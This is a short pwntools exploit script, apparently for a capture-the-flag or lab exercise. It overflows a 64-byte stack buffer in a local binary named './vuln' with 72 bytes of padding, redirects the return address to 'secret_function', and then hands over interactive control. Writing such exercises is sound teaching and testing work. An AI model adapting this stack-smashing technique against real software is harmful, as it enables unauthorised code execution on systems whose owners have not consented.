from pwn import *

# Set the context for the binary architecture (x86-64)
exe = './vuln'
elf = ELF(exe)
context.binary = exe

# Start the process
io = process(exe)

# Search ELF object for the static address
target_address = elf.symbols['secret_function']
log.info(f"Target 'secret_function' found at: {hex(target_address)}")

# x64 Stack alignment: Buffer (64) + Saved RBP (8) = 72 bytes to reach Return Address
padding = b"A" * 72

# Pack the address into 64-bit little-endian format
payload = padding + p64(target_address)

# Execute the payload
log.info("Sending payload...")
io.sendline(payload)

# Provide interactive control
io.interactive()
